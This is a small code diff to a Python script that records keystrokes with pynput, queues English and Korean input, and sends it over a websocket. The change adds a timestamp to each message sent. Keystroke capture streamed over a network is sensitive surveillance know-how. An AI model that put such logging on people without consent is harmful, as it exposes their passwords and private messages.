@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 from pynput.keyboard import Listener, Key
+from datetime import date , datetime
 import asyncio
 import websockets
 import queue
@@ -63,7 +64,7 @@ async def log(websocket, path):
                 if not saveEn.empty():
                     dataEn = saveEn.get()
                     dataKo = saveKo.get()
-                    data = f'En:{dataEn}\n Ko:{dataKo}'
+                    data = f'{datetime.now()} - En:{dataEn} - Ko:{dataKo}'
                     await websocket.send(data)
                 else:
                     pass
